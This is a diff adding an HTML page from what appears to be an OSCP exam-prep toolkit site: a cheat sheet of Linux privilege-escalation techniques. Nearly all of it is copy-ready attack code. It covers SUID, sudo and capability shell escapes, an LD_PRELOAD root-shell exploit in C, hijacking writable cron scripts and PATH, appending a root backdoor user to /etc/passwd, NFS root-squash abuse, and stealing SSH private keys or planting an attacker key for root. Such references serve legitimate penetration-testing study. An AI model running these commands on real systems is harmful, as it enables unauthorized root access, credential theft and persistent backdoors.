@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux PrivEsc - OSCP Toolkit</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>🐧 Linux Privilege Escalation</h1>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="quickcmds.html">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html" class="active">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html">File Transfer</a>
+                <a href="pivoting.html">Pivoting</a>
+                <a href="checklist.html">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="toc">
+            <h3>📑 Quick Navigation</h3>
+            <ul>
+                <li><a href="#auto-enum">Automated Tools</a></li>
+                <li><a href="#suid">SUID/SGID</a></li>
+                <li><a href="#capabilities">Capabilities</a></li>
+                <li><a href="#sudo">Sudo</a></li>
+                <li><a href="#cron">Cron Jobs</a></li>
+                <li><a href="#writable">Writable Files</a></li>
+                <li><a href="#nfs">NFS Root Squashing</a></li>
+                <li><a href="#kernel">Kernel Exploits</a></li>
+                <li><a href="#passwords">Password Hunting</a></li>
+                <li><a href="#ssh">SSH Keys</a></li>
+            </ul>
+        </div>
+
+        <div class="alert alert-info">
+            💡 <strong>Always check:</strong> <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> for binary exploitation techniques!
+        </div>
+
+        <h2 id="auto-enum">🤖 Automated Enumeration</h2>
+        <pre data-lang="bash"><code><span class="comment"># LinPEAS (most comprehensive)</span>
+./linpeas.sh | tee linpeas_output.txt
+
+<span class="comment"># LinEnum</span>
+./LinEnum.sh
+
+<span class="comment"># Linux Smart Enumeration</span>
+./lse.sh -l 1
+
+<span class="comment"># pspy (monitor processes without root)</span>
+./pspy64</code></pre>
+
+        <h2 id="suid">🔑 SUID/SGID Binaries</h2>
+        <h3>Find SUID Binaries</h3>
+        <pre data-lang="bash"><code><span class="comment"># Find SUID files</span>
+find / -perm -4000 -type f 2>/dev/null
+
+<span class="comment"># Find SGID files</span>
+find / -perm -2000 -type f 2>/dev/null
+
+<span class="comment"># With details</span>
+find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null</code></pre>
+
+        <h3>Common SUID Exploits</h3>
+        <table>
+            <thead>
+                <tr><th>Binary</th><th>Command</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>bash</td><td><code>bash -p</code></td></tr>
+                <tr><td>find</td><td><code>find . -exec /bin/sh -p \; -quit</code></td></tr>
+                <tr><td>vim</td><td><code>vim -c ':!/bin/sh'</code></td></tr>
+                <tr><td>python</td><td><code>python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></td></tr>
+                <tr><td>less</td><td><code>less /etc/passwd</code> → <code>!/bin/sh</code></td></tr>
+                <tr><td>awk</td><td><code>awk 'BEGIN {system("/bin/sh")}'</code></td></tr>
+                <tr><td>nmap (old)</td><td><code>nmap --interactive</code> → <code>!sh</code></td></tr>
+            </tbody>
+        </table>
+
+        <h2 id="capabilities">⚙️ Capabilities</h2>
+        <pre data-lang="bash"><code><span class="comment"># Find files with capabilities</span>
+getcap -r / 2>/dev/null</code></pre>
+
+        <h3>Dangerous Capabilities</h3>
+        <table>
+            <thead>
+                <tr><th>Capability</th><th>Binary</th><th>Exploit</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>cap_setuid</td><td>python3</td><td><code>./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></td></tr>
+                <tr><td>cap_setuid</td><td>perl</td><td><code>./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code></td></tr>
+                <tr><td>cap_dac_read_search</td><td>tar</td><td><code>./tar -cvf shadow.tar /etc/shadow && tar -xvf shadow.tar</code></td></tr>
+            </tbody>
+        </table>
+
+        <h2 id="sudo">🔓 Sudo</h2>
+        <pre data-lang="bash"><code><span class="comment"># Check sudo permissions</span>
+sudo -l</code></pre>
+
+        <h3>Common Sudo Exploits</h3>
+        <table>
+            <thead>
+                <tr><th>Entry</th><th>Exploit</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>(ALL) NOPASSWD: /usr/bin/vim</td><td><code>sudo vim -c ':!/bin/sh'</code></td></tr>
+                <tr><td>(ALL) NOPASSWD: /usr/bin/find</td><td><code>sudo find . -exec /bin/sh \; -quit</code></td></tr>
+                <tr><td>(ALL) NOPASSWD: /usr/bin/awk</td><td><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></td></tr>
+                <tr><td>(ALL) NOPASSWD: /usr/bin/python</td><td><code>sudo python -c 'import os; os.system("/bin/sh")'</code></td></tr>
+                <tr><td>(ALL) NOPASSWD: /usr/bin/less</td><td><code>sudo less /etc/passwd</code> → <code>!/bin/sh</code></td></tr>
+            </tbody>
+        </table>
+
+        <h3>LD_PRELOAD Exploit</h3>
+        <pre data-lang="c"><code><span class="comment">// exploit.c</span>
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}</code></pre>
+        <pre data-lang="bash"><code>gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
+sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/apache2</code></pre>
+
+        <h2 id="cron">⏰ Cron Jobs</h2>
+        <pre data-lang="bash"><code><span class="comment"># View cron jobs</span>
+cat /etc/crontab
+cat /etc/cron.d/*
+crontab -l
+
+<span class="comment"># Monitor with pspy</span>
+./pspy64</code></pre>
+
+        <h3>Exploit Writable Cron Script</h3>
+        <pre data-lang="bash"><code><span class="comment"># If cron runs a script you can write to:</span>
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh
+
+<span class="comment"># Wait for cron, then:</span>
+/tmp/bash -p</code></pre>
+
+        <h3>PATH Injection</h3>
+        <pre data-lang="bash"><code><span class="comment"># If cron uses relative path:</span>
+echo '/bin/bash -p' > /tmp/scriptname
+chmod +x /tmp/scriptname
+export PATH=/tmp:$PATH</code></pre>
+
+        <h2 id="writable">📝 Writable Files</h2>
+        <pre data-lang="bash"><code><span class="comment"># Find world-writable directories</span>
+find / -writable -type d 2>/dev/null
+
+<span class="comment"># Find world-writable files</span>
+find / -writable -type f 2>/dev/null</code></pre>
+
+        <h3>/etc/passwd Writable</h3>
+        <pre data-lang="bash"><code><span class="comment"># Generate password hash</span>
+openssl passwd -1 password
+
+<span class="comment"># Add user to passwd</span>
+echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+<span class="comment"># Login</span>
+su hacker</code></pre>
+
+        <h2 id="nfs">🔗 NFS Root Squashing</h2>
+        <pre data-lang="bash"><code><span class="comment"># Check for no_root_squash</span>
+cat /etc/exports
+showmount -e TARGET</code></pre>
+
+        <h3>Exploit (from attacker)</h3>
+        <pre data-lang="bash"><code><span class="comment"># Mount share</span>
+mkdir /tmp/nfs
+mount -o rw TARGET:/share /tmp/nfs
+
+<span class="comment"># Create SUID binary</span>
+cp /bin/bash /tmp/nfs/bash
+chmod +s /tmp/nfs/bash
+
+<span class="comment"># On victim</span>
+/share/bash -p</code></pre>
+
+        <h2 id="kernel">💣 Kernel Exploits</h2>
+        <pre data-lang="bash"><code><span class="comment"># Check kernel version</span>
+uname -r
+cat /proc/version</code></pre>
+
+        <table>
+            <thead>
+                <tr><th>CVE</th><th>Kernel Version</th><th>Name</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>CVE-2016-5195</td><td>2.6.22 < 4.8.3</td><td>DirtyCow</td></tr>
+                <tr><td>CVE-2021-4034</td><td>All (PolicyKit)</td><td>PwnKit</td></tr>
+                <tr><td>CVE-2021-3156</td><td>Sudo < 1.9.5p2</td><td>Baron Samedit</td></tr>
+                <tr><td>CVE-2022-0847</td><td>5.8 < 5.16.11</td><td>DirtyPipe</td></tr>
+            </tbody>
+        </table>
+
+        <h2 id="passwords">🔍 Password Hunting</h2>
+        <pre data-lang="bash"><code><span class="comment"># Search for passwords</span>
+grep -r "password" /home 2>/dev/null
+grep -r "pass" /var/www 2>/dev/null
+
+<span class="comment"># History files</span>
+cat ~/.bash_history
+cat ~/.mysql_history
+
+<span class="comment"># Config files</span>
+find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null</code></pre>
+
+        <h2 id="ssh">🔐 SSH Keys</h2>
+        <pre data-lang="bash"><code><span class="comment"># Find SSH keys</span>
+find / -name "id_rsa" 2>/dev/null
+find / -name "authorized_keys" 2>/dev/null
+
+<span class="comment"># Steal private keys</span>
+cat /home/*/.ssh/id_rsa
+cat /root/.ssh/id_rsa</code></pre>
+
+        <h3>Add Your Key</h3>
+        <pre data-lang="bash"><code><span class="comment"># Generate keypair on attacker</span>
+ssh-keygen -t rsa -b 4096
+
+<span class="comment"># Add public key to target</span>
+echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys</code></pre>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <script>
+        document.querySelectorAll('pre').forEach(pre => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'Copy';
+            btn.onclick = () => {
+                navigator.clipboard.writeText(pre.querySelector('code').textContent);
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                    btn.classList.remove('copied');
+                }, 2000);
+            };
+            pre.style.position = 'relative';
+            pre.appendChild(btn);
+        });
+    </script>
+</body>
+</html>
+
+
